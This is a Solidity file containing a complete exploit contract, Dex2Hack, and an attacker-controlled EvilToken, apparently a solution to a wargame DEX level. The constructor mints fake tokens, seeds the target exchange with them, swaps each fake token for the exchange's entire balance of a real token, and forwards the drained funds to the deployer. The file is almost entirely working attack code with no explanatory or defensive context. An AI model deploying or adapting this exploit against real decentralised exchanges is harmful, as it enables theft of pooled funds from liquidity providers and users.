// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex2 {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Dex2Hack {
    constructor(address dexAddress) {
        // Get token addresses
        IDex2 dex = IDex2(dexAddress);
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // Create two malicious tokens
        EvilToken evilToken1 = new EvilToken("Evil Token 1", "EVIL1");
        EvilToken evilToken2 = new EvilToken("Evil Token 2", "EVIL2");
        
        // Mint 2 tokens each - keep 1, send 1 to dex
        evilToken1.mint(2);
        evilToken2.mint(2);
        
        // Transfer 1 token of each to the dex
        evilToken1.transfer(dexAddress, 1);
        evilToken2.transfer(dexAddress, 1);
        
        // Approve dex to spend our tokens
        evilToken1.approve(dexAddress, 1);
        evilToken2.approve(dexAddress, 1);
        
        // Swap 1 evilToken1 for all of token1
        dex.swap(address(evilToken1), token1, 1);
        
        // Swap 1 evilToken2 for all of token2
        dex.swap(address(evilToken2), token2, 1);
        
        // Send drained tokens to the deployer
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
    }
}


contract EvilToken is IERC20 {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
    
    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }
} 